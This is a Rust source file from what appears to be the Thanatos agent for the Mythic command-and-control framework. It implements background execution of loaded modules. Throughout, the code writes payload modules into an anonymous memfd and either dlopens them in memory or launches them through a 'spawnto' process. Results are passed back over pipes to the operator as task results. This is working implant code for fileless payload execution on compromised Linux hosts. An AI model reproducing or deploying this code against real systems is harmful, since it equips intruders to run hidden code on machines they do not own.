use std::{
    io::{Read, Write},
    os::fd::FromRawFd,
    sync::{atomic::AtomicBool, mpsc, Arc},
    thread::JoinHandle,
};

use agent_utils::{
    errors::ThanatosError,
    linux::linhelpers::UnnamedPipe,
    msg::{CompletedTask, MythicStatus, PendingTask, TaskResults},
};

use crate::tasker::BackgroundTask;

fn execute_task<F>(cb: F) -> JoinHandle<Result<(), ThanatosError>>
where
    F: Fn() -> Result<(), ThanatosError> + Send + Sync + 'static,
{
    std::thread::spawn(move || cb())
}

impl crate::Tasker {
    pub fn run_loaded(&mut self, task: PendingTask) -> Result<Option<TaskResults>, ThanatosError> {
        if let Some(command_data) = self
            .loaded_commands
            .iter()
            .find(|&cmd| cmd.name == task.command)
        {
            // TODO: Facilitate sending Mythic messages to background tasks
            let (agent_tx, _job_rx) = mpsc::channel::<PendingTask>();
            let (job_tx, agent_rx) = mpsc::channel::<CompletedTask>();
            let running = Arc::new(AtomicBool::new(true));
            let uuid = task.id.clone();

            let load_info = command_data.clone();

            let internal = self.exec_internal;
            let spawnto = self.spawnto.clone();

            let params = if !task.parameters.is_empty() {
                Some(task.parameters.clone())
            } else {
                None
            };

            let handle: JoinHandle<Result<Option<TaskResults>, ThanatosError>> =
                std::thread::spawn(move || {
                    // TODO: Facilitate sending Mythic messages to background tasks
                    let (_agent_pipe_sender, _task_pipe_receiver) = UnnamedPipe::create(None)?;
                    let (task_pipe_sender, mut agent_pipe_receiver) = UnnamedPipe::create(None)?;

                    let memfd = unsafe {
                        libc::memfd_create("stream\0".as_ptr().cast(), libc::MFD_CLOEXEC)
                    };
                    if memfd == -1 {
                        return Err(ThanatosError::os_error());
                    }

                    let path = format!("/proc/{}/fd/{}\0", std::process::id(), memfd);

                    let mut f = unsafe { std::fs::File::from_raw_fd(memfd) };
                    f.write_all(&load_info.data)
                        .map_err(|_| ThanatosError::os_error())?;

                    let thr_handle = if load_info.force_internal || internal {
                        execute_task(move || {
                            std::env::set_var("LD_SENDPIPE", task_pipe_sender.to_string());
                            std::env::set_var("LD_INTERNAL", "1");
                            if let Some(params) = &params {
                                std::env::set_var("LD_PARAMS", params);
                            }

                            let handle =
                                unsafe { libc::dlopen(path.as_ptr().cast(), libc::RTLD_LAZY) };
                            if handle.is_null() {
                                return Err(ThanatosError::os_error());
                            }

                            std::env::remove_var("LD_INTERNAL");
                            std::env::remove_var("LD_SENDPIPE");
                            std::env::remove_var("LD_PARAMS");

                            unsafe { libc::dlclose(handle) };
                            Ok(())
                        })
                    } else {
                        execute_task(move || {
                            let spawnto_val = spawnto.clone().ok_or(ThanatosError::NoSpawnTo)?;

                            match params {
                                Some(ref v) => std::process::Command::new(spawnto_val.path)
                                    .args(spawnto_val.args)
                                    .env("LD_INTERNAL", "0")
                                    .env("LD_SENDPIPE", task_pipe_sender.to_string())
                                    .env("LD_PARAMS", v)
                                    .spawn()
                                    .map_err(|_| ThanatosError::os_error())?
                                    .wait()
                                    .map_err(|_| ThanatosError::os_error())?,

                                None => std::process::Command::new(spawnto_val.path)
                                    .args(spawnto_val.args)
                                    .env("LD_INTERNAL", "0")
                                    .env("LD_SENDPIPE", task_pipe_sender.to_string())
                                    .spawn()
                                    .map_err(|_| ThanatosError::os_error())?
                                    .wait()
                                    .map_err(|_| ThanatosError::os_error())?,
                            };

                            Ok(())
                        })
                    };

                    while !thr_handle.is_finished() {
                        let mut length_buffer = [0u8; 4];
                        if let Ok(v) = agent_pipe_receiver.read(&mut length_buffer) {
                            if v > 0 {
                                let length = u32::from_le_bytes(length_buffer);

                                let mut buffer = vec![0u8; length as usize];

                                match agent_pipe_receiver.read(&mut buffer) {
                                    Ok(0) | Err(_) => (),
                                    Ok(_) => {
                                        let status = buffer[0];
                                        let callback = buffer[1];
                                        let data = std::str::from_utf8(&buffer[2..])
                                            .map_err(|_| ThanatosError::StringParseError)?
                                            .to_string();

                                        let attributes = match callback {
                                            0 => TaskResults {
                                                status: MythicStatus::from_u8(status),
                                                completed: false,
                                                user_output: Some(data),
                                                ..Default::default()
                                            },
                                            1 => TaskResults {
                                                status: MythicStatus::from_u8(status),
                                                completed: false,
                                                process_response: Some(data),
                                                ..Default::default()
                                            },
                                            _ => unreachable!(),
                                        };

                                        let _ = job_tx.send(CompletedTask {
                                            task_id: uuid.clone(),
                                            task_attributes: attributes,
                                        });
                                    }
                                }
                            }
                        }
                    }

                    Ok(None)
                });

            if handle.is_finished() {
                handle
                    .join()
                    .map_err(|_| ThanatosError::ThreadJoinError)??;
            }

            let jid = match self.cached_ids.pop_front() {
                Some(jid) => jid,
                None => {
                    self.dispatch_val += 1;
                    self.dispatch_val - 1
                }
            };

            self.background_tasks.push(BackgroundTask {
                jid,
                running,
                uuid: task.id.clone(),
                tx: agent_tx,
                rx: agent_rx,
                detached: command_data.detached,
            });
        }

        Ok(None)
    }
}
